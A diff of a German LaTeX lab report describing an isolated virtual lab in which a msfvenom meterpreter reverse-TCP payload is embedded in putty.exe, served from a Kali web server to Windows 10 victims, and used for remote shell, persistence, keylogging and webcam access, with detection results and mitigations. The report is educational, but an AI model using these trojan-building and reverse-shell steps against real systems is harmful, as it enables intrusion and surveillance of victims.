@@ -7,7 +7,7 @@ Für einen möglichst einfachen und gleichzeitig verhältnismäßig sicheren Abl
 wird das Labor in einer virtualisierten Umgebung ohne Verbindung zum Internet durchgeführt.
 Beispielsweise VirtualBox bietet hierfür eine \glqq Internal Networking\grqq{} Einstellung, unter welcher lediglich die virtuellen Maschinen untereinander kommunizieren können.
 
-\begin{figure}[h!]
+\begin{figure}[ht!]
 	\centering
 	\begin{tikzpicture}[,>={Stealth[round]},shorten >=1pt,auto,semithick]
 		\tikzstyle{pc}=[rectangle,draw=black,minimum size=30pt,inner sep=5pt,align=center]
@@ -30,14 +30,14 @@ Auf dem Angreifer läuft das Betriebssystem \glqq Kali Linux\grqq{}, welches ber
 Außerdem wird der späteren Trojaner über einen Apache Webserver an das Opfer zu übergeben.
 Die Opfer nutzen das weit verbreitete Betriebssystem Windows 10. Mit folgenden Unterschieden:
 
-\begin{itemize}
-	\item \textbf{Opfer 1}: Veraltete Version von Windows 10 (Stand: 27.04.2018)
-	\item \textbf{Opfer 2}: Veraltete Version von Windows 10, allerdings mit Avira Free Security Suite (Version 15.0.36.163)
-	\item \textbf{Opfer 3}: Aktualisierte Version von Windows 10 (Stand: 04.05.2018)
-\end{itemize}
+\begin{description}
+	\item[Opfer 1]Veraltete Version von Windows 10 (Stand: 27.04.2018)
+	\item[Opfer 2]Veraltete Version von Windows 10, allerdings mit Avira Free Security Suite (Version 15.0.36.163)
+	\item[Opfer 3]Aktualisierte Version von Windows 10 (Stand: 04.05.2018)
+\end{description}
 
 \subsection{Ablauf}\label{sec:praktischeDurchfuehrung-ablauf}
-\begin{figure}[h!]
+\begin{figure}[ht!]
 	\centering
 	\begin{sequencediagram}
 		\newthread{a}{Angreifer}
@@ -69,12 +69,13 @@ Die Opfer nutzen das weit verbreitete Betriebssystem Windows 10. Mit folgenden U
 	\caption{Ablauf} \label{fig:Ablauf}
 \end{figure}
 
-\textbf{1. Erstellen des Trojaners: } \hfill \\
-Zunächst wird auf dem Angreifer der Trojaner erstellt.
+\textbf{1. Erstellen des Trojaners: }
+Zunächst wird auf dem System des Angreifers der Trojaner erstellt.
 Ziel ist es den Payload \code{windows/meterpreter/reverse\_tcp} in ein normales Programm (hier das bekannte \code{putty.exe}) einzuschleusen. 
 Dies geschieht mit dem Befehl \code{msfvenom} \cite{OSMSFV}, wobei folgende Parameter gesetzt werden:
 \begin{itemize}
-	\item \textbf{Payload}: \\\code{-p windows/meterpreter/reverse\_tcp}
+	\item \textbf{Payload}: \\
+		  \code{-p windows/meterpreter/reverse\_tcp}
 	      \begin{itemize}
 		      \item  \textbf{Angreifer-IP}: \code{lhost=192.168.100.101}
 		      \item \textbf{Angreifer-Port}: \code{lport=6666}
@@ -88,64 +89,61 @@ Dies geschieht mit dem Befehl \code{msfvenom} \cite{OSMSFV}, wobei folgende Para
 \end{itemize}
 
 \bigskip
-\textbf{2. Aktivieren des Listeners: } \hfill \\
+\textbf{2. Aktivieren des Listeners: } 
 Zur Aktivierung des Listeners wird die grafische Oberfläche Armitage verwendet.
 Der Listener wird über \code{exploit/multi/handler} gestartet.
 Hierfür muss dieser mit dem Payload (inkl. IP-Adresse und Port) aus Schritt 1 konfiguriert werden.
 
 \bigskip
-\textbf{3. Verbreiten und Ausführen des Trojaners: }\hfill \\
+\textbf{3. Verbreiten und Ausführen des Trojaners: }
 Der erstellte Trojaner wird in das Wurzelverzeichnis des Webservers \code{/var/www/html} kopiert um diesen einfach, und gleichzeitig verhältnismäßig realitätsnah an die Opfer zu übermitteln.
 In der Praxis könnte zum verbreiten des Trojaners zum Beispiel DNS-Spoofing verwendet werden, um dem Opfer den Trojaner statt dem eigentlichen Programm zu übergeben.
 Führt das Opfer das Programm mit dem Trojaner aus, so baut dieser eine Verbindung zum Angreifer auf. 
 
 \bigskip
-\textbf{4. Attackieren des Opfer-Systems: } \hfill \\
+\textbf{4. Attackieren des Opfer-Systems: }
 Der Angreifer kann nun mithilfe von Armitage und meterpreter Zugriff auf diverse Systemfunktionalität wie Beispielsweise:
-\begin{itemize}
-	\item Interaktion (interaction)
+\begin{description}
+	\item[Interaktion (interaction)]
 		\begin{itemize}
+			\item[]  
 			\item Shell/Kommandozeile öffnen und verwenden
 			\item VNC-Verbindung aufbauen
 		\end{itemize}
-	\item Zugriff (access)
+	\item[Zugriff (access)]
 		\begin{itemize}
+			\item[]
 			\item Privilegien ausweiten
 			\item Trojaner persistieren
 		\end{itemize}
-	\item Entdecken (explore)
+	\item[Entdecken (explore)]  
 		\begin{itemize}
+			\item[]  
 			\item Dateienverzeichnis anzeigen
 			\item Prozesse anzeigen
 			\item Keylogger aktivieren
 			\item Screenshots
 			\item Webcamaufnahmen 
 		\end{itemize}
-\end{itemize}
+\end{description}
 
 \subsection{Funktionsweise des Trojaners}\label{sec:praktischeDurchfuehrung-funktionsweise}
-\textbf{Was macht der Trojaner? }
-Der Trojaner stellt die Verbindung vom Opfer-System zum Angreifer her.
+Der Trojaner kombiniert die Arten Backdoor und Linker indem er den Schadcode \textit{meterpreter} 
+in dem Programm \textit{putty} versteckt.
+Beim Ausführen stellt dieser eine Verbindung vom Zielsystem zum Angreifer her.
 
-\textbf{Welche Schwachstelle wird ausgenutzt? }
-\begin{itemize}
-	\item Fehlende Updates
-	\item Nutzer-Schwachstelle beim Download
-		\begin{itemize}
-			\item kein https
-			\item keine Überprüfung der Programmsignatur
-		\end{itemize}
-\end{itemize}
+Hierbei wird einerseits ausgenutzt, dass das Betriebssystem bzw. die Antivirus-Software nicht ausreichend aktualisiert wurde.
+Andererseits könnte der Angriff durch wählen einer sicheren Download-Quelle (z.B. mittels https)
+oder einem Vergleich der Prüfsumme mit einer vertrauenswürdigen Quelle verhindert werden.
 
 \subsection{Ergebnisse}\label{sec:praktischeDurchfuehrung-ergebnisse}
 
-\textbf{Bewertung des Baukastens: }\hfill \\
 Der Baukasten ist leicht zu Bedienen und durch ergiebige Dokumentation ist kein Fachwissen notwendig.
 Außerdem bietet er dank dem modularen Aufbau zahlreiche Möglichkeiten um Trojaner oder andere Schadsoftware für verschiedene Systeme zu erzeugen.
 
-\textbf{Bewertung des Trojaners: }\hfill \\
 Die Trojaner ist sehr einfach zu Erzeugen und Anzuwenden. 
 Dieser Trojaner ist jedoch durch einfache Schutzmechanismen bereits zu erkennen.
 Im Versuch zeigte sich, dass sowohl die aktualisierte Windows-Version sowie der Avira-Schutz den Trojaner rechtzeitig erkennen konnten.
 Lediglich die veraltete Windows-Version konnte den Trojaner nicht erkennen. 
-Der Trojaner selbst richtet keinen Schaden an, eröffnet jedoch Möglichkeiten für weitere Angriffe.
+
+Zwar richtet der Trojaner selbst keinen direkten Schaden an, eröffnet jedoch Möglichkeiten für weitere Angriffe.
